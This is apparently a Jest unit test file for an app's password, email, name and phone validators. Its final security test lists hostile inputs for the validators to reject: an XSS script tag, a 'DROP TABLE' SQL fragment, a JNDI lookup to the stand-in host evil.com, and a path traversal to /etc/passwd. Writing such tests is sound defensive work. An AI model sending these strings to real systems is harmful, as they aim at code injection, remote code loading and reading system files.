/**
 * Unit Tests for Password and Validation Utilities
 * Tests validation functions in isolation
 */

import {
  isValidPassword,
  isValidEmail,
  isValidName,
  isValidPhone,
  isValidPasswordStrength,
  isValidConfirmPassword
} from '@/lib/auth/password-utils';

describe('Password and Validation Utils', () => {
  describe('isValidPassword', () => {
    it('should accept valid strong passwords', () => {
      const validPasswords = [
        'MyStr0ng!Pass',
        'Test123!@#',
        'Complex1$pwd',
        'Secure@2024'
      ];

      validPasswords.forEach(password => {
        expect(isValidPassword(password)).toBe(true);
      });
    });

    it('should reject passwords that are too short', () => {
      const shortPasswords = [
        'Short1!',
        'A1!',
        '1234567'
      ];

      shortPasswords.forEach(password => {
        expect(isValidPassword(password)).toBe(false);
      });
    });

    it('should reject passwords without uppercase letters', () => {
      const noUppercase = [
        'lowercase123!',
        'nouppercases1!',
        'password123@'
      ];

      noUppercase.forEach(password => {
        expect(isValidPassword(password)).toBe(false);
      });
    });

    it('should reject passwords without lowercase letters', () => {
      const noLowercase = [
        'UPPERCASE123!',
        'NOUPPER123@',
        'PASSWORD123#'
      ];

      noLowercase.forEach(password => {
        expect(isValidPassword(password)).toBe(false);
      });
    });

    it('should reject passwords without numbers', () => {
      const noNumbers = [
        'NoNumbers!@#',
        'OnlyLetters!',
        'Password@#$'
      ];

      noNumbers.forEach(password => {
        expect(isValidPassword(password)).toBe(false);
      });
    });

    it('should reject passwords without special characters', () => {
      const noSpecial = [
        'NoSpecial123',
        'Password123',
        'OnlyLettersAndNumbers123'
      ];

      noSpecial.forEach(password => {
        expect(isValidPassword(password)).toBe(false);
      });
    });

    it('should handle empty and null inputs', () => {
      expect(isValidPassword('')).toBe(false);
      expect(isValidPassword(null as any)).toBe(false);
      expect(isValidPassword(undefined as any)).toBe(false);
    });
  });

  describe('isValidEmail', () => {
    it('should accept valid email addresses', () => {
      const validEmails = [
        'user@example.com',
        'test.email@domain.org',
        'user+tag@example.co.uk',
        'admin@selsa.app',
        'customer123@shop.com'
      ];

      validEmails.forEach(email => {
        expect(isValidEmail(email)).toBe(true);
      });
    });

    it('should reject invalid email addresses', () => {
      const invalidEmails = [
        'invalid-email',
        '@example.com',
        'user@',
        'user@.com',
        'user.example.com',
        '',
        'user@domain.',
        'user space@domain.com'
      ];

      invalidEmails.forEach(email => {
        expect(isValidEmail(email)).toBe(false);
      });
    });

    it('should handle edge cases', () => {
      expect(isValidEmail(null as any)).toBe(false);
      expect(isValidEmail(undefined as any)).toBe(false);
      expect(isValidEmail('   ')).toBe(false);
    });
  });

  describe('isValidName', () => {
    it('should accept valid names', () => {
      const validNames = [
        'John',
        'Jane Doe',
        'Mary-Jane',
        "O'Connor",
        'Jean-Pierre',
        'Van Der Berg'
      ];

      validNames.forEach(name => {
        expect(isValidName(name)).toBe(true);
      });
    });

    it('should reject invalid names', () => {
      const invalidNames = [
        '',
        '123',
        'Name123',
        'Name@#$',
        'A', // Too short
        'A'.repeat(51), // Too long
        '   ', // Only whitespace
        'Name!@#'
      ];

      invalidNames.forEach(name => {
        expect(isValidName(name)).toBe(false);
      });
    });

    it('should handle null and undefined', () => {
      expect(isValidName(null as any)).toBe(false);
      expect(isValidName(undefined as any)).toBe(false);
    });
  });

  describe('isValidPhone', () => {
    it('should accept valid phone numbers', () => {
      const validPhones = [
        '123-456-7890',
        '(123) 456-7890',
        '+1-123-456-7890',
        '1234567890',
        '+251911123456', // Ethiopian format
        '251911123456'
      ];

      validPhones.forEach(phone => {
        expect(isValidPhone(phone)).toBe(true);
      });
    });

    it('should reject invalid phone numbers', () => {
      const invalidPhones = [
        '',
        '123',
        'abc-def-ghij',
        '123-456', // Too short
        '123-456-7890-1234', // Too long for format
        'phone-number',
        '   '
      ];

      invalidPhones.forEach(phone => {
        expect(isValidPhone(phone)).toBe(false);
      });
    });
  });

  describe('isValidPasswordStrength', () => {
    it('should rate password strength correctly', () => {
      const weakPasswords = [
        'password',
        '12345678',
        'abcdefgh'
      ];

      const mediumPasswords = [
        'Password1',
        'password123',
        'Password!'
      ];

      const strongPasswords = [
        'MyStr0ng!Pass',
        'Complex1$pwd',
        'Secure@2024!'
      ];

      weakPasswords.forEach(password => {
        expect(isValidPasswordStrength(password)).toBeLessThan(3);
      });

      mediumPasswords.forEach(password => {
        const strength = isValidPasswordStrength(password);
        expect(strength).toBeGreaterThanOrEqual(2);
        expect(strength).toBeLessThan(4);
      });

      strongPasswords.forEach(password => {
        expect(isValidPasswordStrength(password)).toBeGreaterThanOrEqual(4);
      });
    });

    it('should return 0 for empty passwords', () => {
      expect(isValidPasswordStrength('')).toBe(0);
      expect(isValidPasswordStrength(null as any)).toBe(0);
      expect(isValidPasswordStrength(undefined as any)).toBe(0);
    });
  });

  describe('isValidConfirmPassword', () => {
    it('should return true when passwords match', () => {
      const password = 'MyStr0ng!Pass';
      const confirmPassword = 'MyStr0ng!Pass';

      expect(isValidConfirmPassword(password, confirmPassword)).toBe(true);
    });

    it('should return false when passwords do not match', () => {
      const password = 'MyStr0ng!Pass';
      const confirmPassword = 'Different!Pass1';

      expect(isValidConfirmPassword(password, confirmPassword)).toBe(false);
    });

    it('should handle empty strings', () => {
      expect(isValidConfirmPassword('', '')).toBe(true);
      expect(isValidConfirmPassword('password', '')).toBe(false);
      expect(isValidConfirmPassword('', 'password')).toBe(false);
    });

    it('should handle null and undefined', () => {
      expect(isValidConfirmPassword(null as any, null as any)).toBe(true);
      expect(isValidConfirmPassword(undefined as any, undefined as any)).toBe(true);
      expect(isValidConfirmPassword('password', null as any)).toBe(false);
      expect(isValidConfirmPassword(null as any, 'password')).toBe(false);
    });

    it('should be case sensitive', () => {
      expect(isValidConfirmPassword('Password', 'password')).toBe(false);
      expect(isValidConfirmPassword('PASSWORD', 'password')).toBe(false);
    });
  });

  describe('Edge Cases and Security', () => {
    it('should handle very long inputs gracefully', () => {
      const veryLongString = 'a'.repeat(1000);
      
      expect(isValidEmail(veryLongString)).toBe(false);
      expect(isValidName(veryLongString)).toBe(false);
      expect(isValidPhone(veryLongString)).toBe(false);
    });

    it('should handle special unicode characters', () => {
      const unicodePasswords = [
        'Pässwörd123!',
        'пароль123!А',
        'パスワード123!'
      ];

      // These should be handled appropriately based on your requirements
      unicodePasswords.forEach(password => {
        expect(() => isValidPassword(password)).not.toThrow();
      });
    });

    it('should prevent injection attacks in validation', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'DROP TABLE users;',
        '${jndi:ldap://evil.com}',
        '../../../etc/passwd'
      ];

      maliciousInputs.forEach(input => {
        expect(isValidEmail(input)).toBe(false);
        expect(isValidName(input)).toBe(false);
        expect(isValidPassword(input)).toBe(false);
      });
    });
  });
});